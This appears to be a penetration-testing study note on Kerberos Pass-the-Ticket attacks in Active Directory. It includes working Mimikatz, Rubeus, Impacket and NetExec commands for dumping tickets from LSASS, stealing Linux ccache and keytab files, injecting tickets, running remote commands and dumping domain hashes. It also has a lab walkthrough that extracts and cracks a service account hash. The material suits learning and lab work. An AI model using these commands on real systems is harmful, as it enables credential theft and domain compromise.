---
created: 2026-08-06
updated: 2026-10-11
tags:
  - AD
  - AD_attacks
  - Kerberos
status: substantial
---
## Pass-the-Ticket

>In a **Pass-the-Ticket (PtT)** attack, an attacker extracts valid Kerberos authentication material — either **Ticket-Granting Tickets (TGTs)** or **Service Tickets (STs)** together with the associated session key — from a compromised system and reuses it to authenticate to domain services without knowing the user's password.

- The attack targets the **ticket-based authentication mechanism of the [[Kerberos]] protocol**, which is the primary authentication protocol used in Active Directory environments.
- The key is that the possession of a valid ticket and the required session key is sufficient to authenticate — you don't need to recover the user's plaintext password, just **reuse an already-issued credential directly** instead.

>[!note] A ticket alone is not enough; to complete the authentication exchange, you also need the associated **session key**. Fortunately, it is normally stored along with the ticket in the cache, so you'd retrieve both at once.

>[!note] Pass-the-Ticket vs. Pass-the-Hash
>- [[Pass-the-Hash]] (PtH) abuses the NTLM authentication protocol (uses a user's NT hash as an alternative authentication material instead of the plaintext password); Pass-the-Ticket operates entirely within **Kerberos**.
>- PtH generates NTLM authentication traffic ([`NTLMSSP`](https://learn.microsoft.com/en-us/windows/win32/com/ntlmssp)) over SMB/RPC, which is often monitored and audited; PtT generates standard Kerberos messages (`TGS-REQ` or service connection), which makes the attack harder to detect.
>- PtH requires an NT hash; PtT requires a Kerberos ticket and the associated session key.

>[!note] Unlike in [[Kerberoasting]] or [[AS-REP roasting]], where Kerberos material is obtained and attacked **offline to recover a long-term secret**, Pass-the-Ticket reuses a **valid Kerberos credential directly**.

- Prerequisites for the attack:
	- A **valid Kerberos ticket** (TGT or ST) and the associated session key.
	- **Network connectivity to the target service** (and to the DC on TCP/UDP port `88` if using a TGT to request new STs).
	- **Proper DNS/host name resolution** (Kerberos requires connecting via target FQDN, not IP address).

> [!note] See [[Kerberos]] to learn more about the protocol and how it works.

### TGT vs. ST

- The pass-the-ticket attack works with both **TGTs (Ticket-Granting Tickets)** and **STs (Service Tickets)**, but the capabilities they provide differ significantly.

>[!important] Tickets remain usable only within their validity period. 

- A **TGT** is issued by the AS (Authentication Server, part of the KDC) during the AS exchange and is encrypted using the `krbtgt` account's long-term key. A TGT can be used to request Service Tickets for any service the user is authorized to access across the domain.

>[!note] See [Kerberos > Ticket-Granting Tickets (TGTs)](<Kerberos.md#Ticket-Granting Tickets (TGTs)>).

- An **ST** is issued by the TGS (Ticket-Granting Server, part of the KDC) during the TGS exchange and is encrypted using the target service account's key. An ST grants access only to the service it was issued for (it can't be used to request  tickets for other services).

>[!note] See [[Kerberos#Service Tickets (STs)]].

- In practice, passing a stolen **TGT** allows you to authenticate to **any Kerberos-enabled service the compromised user is authorized to access** — by requesting additional Service Tickets. 

>[!tip] TGT -> request STs -> authenticate to many services.

- Passing a stolen **ST**, on the other hand, grants access only to the specific service that ticket was issued for.

>[!tip] ST -> authenticate to one specific service.
## Harvesting Kerberos tickets

- Before you can reuse tickets in a Pass-the-Ticket attack, well, you must obtain them first. 
### Extracting tickets on Windows

- On Windows, Kerberos tickets are stored in memory within the **Kerberos ticket cache** maintained by the LSASS.
- Each logon session has its own ticket cache with the user's TGT and any STs obtained during the session.
- An unprivileged user can access only the tickets belonging to **their own logon session**. Extracting tickets belonging to **other (logged-in) users** means reading LSASS memory, which requires **local administrative privileges** (typically `SYSTEM` or an account with `SeDebugPrivilege`).

>[!note] See [[SeDebugPrivilege]].

 - Windows tools like Mimikatz and Rubeus typically export tickets into **binary `.kirbi` files** format (a serialized `KRB-CRED` structure encoded using [ASN.1](https://en.wikipedia.org/wiki/ASN.1) [DER](https://en.wikipedia.org/wiki/X.690#DER_encoding)). Rubeus, for example, can also display tickets as Base64-encoded `.kirbi` blobs instead of writing them directly to disk.
#### Mimikatz

- Export all tickets from LSASS memory to `.kirbi` files on disk:

```powershell
mimikatz.exe
```

```powershell
privilege::debug
```

```powershell
sekurlsa::tickets /export
```

- [`privilege::debug`](https://tools.thehacker.recipes/mimikatz/modules/privilege/debug) requests/enables `SeDebugPrivilege` (to read LSASS memory).
- [`sekurlsa::tickets`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/tickets) lists Kerberos tickets belonging to all authenticated users on the target; `/export` exports tickets in `.kirbi` files (to the directory where Mimikatz was ran).

- List exported tickets:

```powershell
dir *.kirbi
```

>[!note] Tickets ending with `$` -> correspond to the computer account.

- [`kerberos::list`](https://tools.thehacker.recipes/mimikatz/modules/kerberos/list) lists all Kerberos tickets currently cached in the user's session memory (rather than dumping them into as `sekurlsa::tickets` does. The functionality is similar to the [`klist`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist) command, and it doesn't require elevated privileges.

```bash
kerberos::list
```
#### Rubeus

 - Dump tickets into `stdout` as Base64-encoded `kirbi` blobs (without writing them to disk):

```powershell
Rubeus.exe dump /nowrap
```

- Export tickets as `.kirbi` files to a specific directory:

```powershell
Rubeus.exe dump /dir:C:\Term\tickets
```

- Continuously monitor LSASS and harvest newly created Kerberos tickets as users authenticate (for example, during password spraying or interactive logons):

```bash
Rubeus.exe harvest /interval:30
```
### Extracting tickets on Linux

>[!tip] To determine whether a Linux system is domain-joined, run the [`realm`](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) command. If it's not available, look processes like [`sssd`](https://sssd.io/) or [`winbind`](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html).
>```bash
>realm
>```
>```bash
>ps -ef | grep -i "winbind\|sshd"
>```

- On Linux, Kerberos tickets are stored in **credential cache (ccache)**.
- A credential cache is a binary container associated with a Kerberos principal that stores active session tickets (TGT and STs).
- The cache location and storage mechanism are configurable: 
	- `FILE`: tickets are stored in file, commonly under `/tmp` (the exact location is specified in the `KRB5CCNAME` environment variable); the files are named as `/tmp/krb5cc_<uid>`.
	- `KEYRING`: tickets are stored in the kernel keyring (in kernel memory).
	- `KCM`: tickets are managed by a **Kerberos Cache Manager (KCM)** daemon, (commonly provided by `SSSD` or `Heimdal`); in this case, client applications communicate with the daemon rather than access cache files directly.

>[!note] See [`Credential cache — MIT Kerberos Documentation`](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html).

- See where tickets are stored:

```bash
env | grep -i krb5
```

- Inspect the tickets within the current/default cache:

```bash
klist
```

>[!note] See [`klist`](https://man.archlinux.org/man/klist.1.en).

- Search for credential cache files in `/tmp` (only works for `FILE`-based cache):

```bash
ls -la /tmp/krb5cc_*
```

```bash
find /tmp -name 'krb5cc*'
```

- Inspect `SSSD` cache directories for stored ticket files:

```bash
ls -la /var/lib/sss/db/
```
### Converting ticket formats

- When you transfer stolen tickets between Windows and Linux, you may need to convert between the `.kirbi` and `.ccache` formats. Impacket's [`ticketConverter.py`](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py) does just that.

- Convert a `.kirbi` ticket to `.ccache`:

```bash
ticketConverter.py administrator.kirbi administrator.ccache
```

- Convert a `.ccache` ticket to `.kirbi`:

```bash
ticketConverter.py administrator.ccache administrator.kirbi
```

>[!note] The ticket itself is not modified — only its representation is converted. 

- Convert `.kirbi` to Base64-encoded blobs (PowerShell):

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("administrator.kirbi"))
```

## Executing Pass-the-Ticket

### Pass-the-Ticket on Windows

- To reuse a ticket on Windows, you'd need to place it into the current Kerberos ticket cache where applications can access it. 
#### Rubeus 

- Rubeus 's `ptt` (Pass-the-Ticket) can inject a `.kirbi` ticket directly into the current logon session (it submits the ticket to the LSA via `LsaCallAuthenticationPackage()` API):

```powershell
Rubeus.exe ptt /ticket:administrator.kirbi
```

- You can also inject a Base64-encoded `.kirbi` blob directly:

```powershell
Rubeus.exe ptt /ticket:<Base64_blob>
```

- Create a hidden sacrificial process and inject the ticket into that specific session (avoids polluting current session context):

```powershell
Rubeus.exe ptt /ticket:administrator.kirbi /luid:0x123456
```

#### Mimikatz

- Inject a `.kirbi` ticket file into the current logon session:

```powershell
mimikatz.exe
```

```powershell
kerberos::ptt administrator.kirbi
```

- [`kerberos::ptt`](https://tools.thehacker.recipes/mimikatz/modules/kerberos/ptt) injects one or more Kerberos tickets in the current session (either TGT or ST); the module accepts either a `.kibri` file (injects just one ticket) or a directory (injects all `.kirbi` tickets found there) as a argument.

- Verify that the ticket was successfully injected into the current session's Kerberos cache:

```cmd
klist
```

- You can then access target network resources using standard Windows tools:

```cmd
dir \\DC01.example.com\c$
```

```powershell
Enter-PSSession -ComputerName DC01.example.com
```

### Pass-the-Ticket from Linux

#### Impacket

- To tell Kerberos-aware tools where to get credentials, set the `KRB5CCNAME` environment variable to point to the `.ccache` ticket file:

```bash
export KRB5CCNAME=/path/to/target_user.ccache
```

- Verify the cache is valid and inspect the cached credentials — including the client principal, ticket type, validity period, services for which the tickets have been obtained — using `klist`:

```bash
klist
```

- With Impacket scripts, use the `-k` option to authenticate using Kerberos and the credentials from the `KRB5CCNAME` cache. The `-no-pass` option prevents Impacket from prompting for a password, so authentication relies on the cached Kerberos credentials instead.

- Execute commands remotely over SMB using `psexec.py`:

```bash
psexec.py -k -no-pass EXAMPLE.COM/Administrator@DC01.example.com
```

- The supplied account and target FQDN identify the Kerberos principal and target service; the existing ticket in the cache is used for authentication.

- Dump domain SAM / LSA / NTDS hashes remotely using `secretsdump.py`:

```bash
secretsdump.py -k -no-pass DC01.example.com
```

- Execute commands remotely over WMI using `wmiexec.py`:

```bash
wmiexec.py -k -no-pass EXAMPLE.COM/Administrator@DC01.example.com
```
#### NetExec

- NetExec can also use the Kerberos credentials stored in the active ccache. The `-k` option enables Kerberos authentication and uses the cached ticket instead of a password:

```bash
netexec smb DC01.example.com -k
```

## Kerberos keytabs

>A **keytab** (short for *key table*) is a file that stores long-term cryptographic keys for one or more Kerberos principals.

- These files contain pairs of **Kerberos principals** and **encrypted keys** derived from the principal's password (along with Key Version Numbers, or KVNOs).
---
- Keytabs are primarily used on Linux/Unix systems (and Java applications) to authenticate service accounts or users to Active Directory — without hard-coding plaintext passwords in scripts or configurations.
- A `.keytab` file effectively acts as a local credential store for Kerberos long-term keys (RC4, AES-128, AES-256) necessary to perform `AS-REQ` exchange (to obtain TGTs).

>[!important] Anyone who can read a `.keytab` file can extract the stored long-term keys to attempt recover plaintext password or use the keytab directly to request a Kerberos TGT for the associated principal.

### Enumerating keytab files

- Search for keytabs across the filesystem:

```bash
find / -name "*keytab*" -o -name "*kt" -ls 2>/dev/null
```

>[!important] To use a keytab file, you must have read and write (`rw`) permissions on it.

>[!example]-
> ```bash
> find / -name *keytab* -ls 2>/dev/null
> ```
> ```bash
> 131610 4 -rw------- 1 root root 1348 Oct 4 16:26 /etc/krb5.keytab 262169 4 -rw-rw-rw- 1 root root 216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
> ```

- Keytab files are also commonly found in automated scripts or cronjobs. 

```bash
crontab -l
```

> [!example]-
> - List Cron jobs:
> ```bash
> crontab -l
> ```
> ```bash
> # ...
> */5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
> ```
> - Check permissions on the script executed by a Cron job:
> ```bash
> ls -l /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
> ```
> ```bash
> -rwx------ 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 251 Oct  6  2022 /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
> ```
> - List the script directory:
> ```bash
> ls -la /home/carlos@inlanefreight.htb/.scripts/
> ```
> ```bash
> total 24
> drwx------ 2 carlos@inlanefreight.htb domain users@inlanefreight.htb 4096 Sep  5 11:00 .
> drwx---r-x 5 carlos@inlanefreight.htb domain users@inlanefreight.htb 4096 Oct 12  2022 ..
> -rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  146 Oct  6  2022 john.keytab
> -rwx------ 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  251 Oct  6  2022 kerberos_script_test.sh
> -rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  246 Sep  5 11:00 svc_workstations._all.kt
> -rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb   94 Sep  5 11:00 svc_workstations.kt
> ```
> 
> - Extract a long-term key from a keytab file:
> ```bash
> python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
> ```
> 
> ```bash
> [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
> [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
> [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
> [+] Keytab File successfully imported.
> 	REALM : INLANEFREIGHT.HTB
> 	SERVICE PRINCIPAL : svc_workstations/
> 	NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
> 	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
> 	AES-128 HASH : 3a7e52143531408f39101187acc80677
> ```
> 
> 
> - Store the hash in a file:
> 
> ```bash
> cat svc_ntlm.txt
> ```
> ```bash
> 7247e8d4387e76996ff3f18a34316fdd
> ```
> - Crack the hash using JohnTheRipper:
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT svc_ntlm.txt
> ```
> ```bash
> Using default input encoding: UTF-8
> Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
> Warning: no OpenMP support for this hash type, consider --fork=6
> Press 'q' or Ctrl-C to abort, almost any other key for status
> Password4        (?)     
> 1g 0:00:00:00 DONE (2026-09-05 07:08) 20.00g/s 3793Kp/s 3793Kc/s 3793KC/s REBEL1..KATHY1
> Use the "--show --format=NT" options to display all of the cracked passwords reliably
> Session completed. 
> ```
> - Display the cracked password:
> ```bash
> john --show --format=NT svc_ntlm.txt
> ```
> ```bash
> ?:Password4
> 
> 1 password hash cracked, 0 left
> ```

### Authenticating using keytabs

- On Linux systems with MIT Kerberos utilities installed, use `kinit` with the `-kt` option to request a TGT using a keytab file:

```bash
kinit -k -t /path/to/file.keytab <user>@<DOMAIN.COM>
```

- Inspect the active Kerberos cache to verify ticket retrieval:

```bash
klist
```

>[!example]-
> ```bash
> kinit -k -t /opt/specialfiles/carlos.keytab carlos@INLANEFREIGHT.HTB
> ```
> 
> ```bash
> klist
> ```
> ```bash
> Ticket cache: FILE:/tmp/krb5cc_647401107_I12lSb
> Default principal: carlos@INLANEFREIGHT.HTB
> 
> Valid starting       Expires              Service principal
> 09/05/2026 10:19:41  09/05/2026 20:19:41  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
> 	renew until 09/06/2026 10:19:41
> ```

>[!note] See [`klist`](https://man.archlinux.org/man/klist.1.en) and [`kinit`](https://man.archlinux.org/man/kinit.1).


## References and further reading


- [`Cached Kerberos tickets — The Hacker Recupes`](https://www.thehacker.recipes/ad/movement/credentials/dumping/cached-kerberos-tickets)
- [`Pass-the-Ticket — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/ptt)
- [`Rubeus — GhostPack GitHub`](https://github.com/GhostPack/Rubeus)
- [`Mimikatz — gentilkiwi GitHub`](https://github.com/gentilkiwi/mimikatz)
- [`Impacket — Fortra GitHub`](https://github.com/fortra/impacket)
- [`Kerberos Tickets Export and Injection — SpecterOps blog`](https://posts.specterops.io/)
- [`Credential cache — MIT Kerberos Documentation`](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html)

- TODO:
	- `.kt` vs. `.keytab`?

```bash
root@linux01:/home/svc_workstations@inlanefreight.htb# ls -la /tmp
total 76
drwxrwxrwt 13 root                               root                           4096 Sep  5 11:15 .
drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
drwxrwxrwt  2 root                               root                           4096 Sep  5 10:44 .font-unix
drwxrwxrwt  2 root                               root                           4096 Sep  5 10:44 .ICE-unix
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Sep  5 11:15 krb5cc_647401106_HRJDux
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1414 Sep  5 11:15 krb5cc_647401106_QAMNbC
-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 1406 Sep  5 10:47 krb5cc_647401107_aNqurh
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Sep  5 11:14 krb5cc_647401109_TCP7Gh
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1746 Sep  5 11:15 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1433 Sep  5 10:49 krb5cc_647402606_pjYOeR
drwx------  3 root                               root                           4096 Sep  5 10:44 snap.lxd
drwx------  3 root                               root                           4096 Sep  5 10:44 systemd-private-68bf4509be9c4e879e5c6d94755d3716-ModemManager.service-fvIdYe
drwx------  3 root                               root                           4096 Sep  5 10:44 systemd-private-68bf4509be9c4e879e5c6d94755d3716-systemd-logind.service-NVlwmj
drwx------  3 root                               root                           4096 Sep  5 10:44 systemd-private-68bf4509be9c4e879e5c6d94755d3716-systemd-resolved.service-fN7Wij
drwx------  3 root                               root                           4096 Sep  5 10:44 systemd-private-68bf4509be9c4e879e5c6d94755d3716-systemd-timesyncd.service-uYk2Kg
drwxrwxrwt  2 root                               root                           4096 Sep  5 10:44 .Test-unix
drwx------  2 root                               root                           4096 Sep  5 10:44 vmware-root_699-3979839557
drwxrwxrwt  2 root                               root                           4096 Sep  5 10:44 .X11-unix
drwxrwxrwt  2 root                               root                           4096 Sep  5 10:44 .XIM-unix
root@linux01:/home/svc_workstations@inlanefreight.htb# cd
root@linux01:~# cp /tmp/krb5cc_647401106_HRJDux .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_HRJDux
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
	renew until 10/08/2022 11:32:01
```
## drafts


| Tool       | Command                                  | Description                                                 |
| ---------- | ---------------------------------------- | ----------------------------------------------------------- |
| `Rubeus`   | `Rubeus.exe ptt /ticket:<path\|base64>`  | Inject ticket into current session memory.                  |
| `Rubeus`   | `Rubeus.exe dump /nowrap`                | Dump all tickets from LSASS as Base64 strings.              |
| `Mimikatz` | `kerberos::ptt <file.kirbi>`             | Inject `.kirbi` ticket into session memory.                 |
| `Mimikatz` | `sekurlsa::tickets /export`              | Export all LSASS session tickets to `.kirbi` files.         |
| `Impacket` | `ticketConverter.py <in> <out>`          | Convert tickets between `.kirbi` and `.ccache` formats.     |
| Linux CLI  | `export KRB5CCNAME=/path/to/file.ccache` | Set active Kerberos ticket cache for current shell session. |
| `Impacket` | `<tool>.py -k -no-pass DOMAIN/user@FQDN` | Execute Impacket tools using loaded Kerberos ticket cache.  |

### Ticket formats and conversion

> [!important]+ Kerberos requirements on Linux
>- **FQDN requirement**: Kerberos requires connecting to the target using its **Fully Qualified Domain Name (FQDN)** (e.g., `DC01.example.com`), NOT an IP address. Connecting via IP causes authentication fallback to NTLM, which will fail when using a Kerberos ticket.
>- **DNS resolution**: Ensure `/etc/hosts` or `/etc/resolv.conf` properly maps the target domain FQDN to the target IP address.
>- **Clock synchronization**: Ensure the Linux host clock is synchronized with the Domain Controller clock (within 5 minutes threshold). Use `ntpdate` or `chrony` to sync time with the DC:
>  ```bash
>  sudo ntpdate 172.16.5.5
>  ```

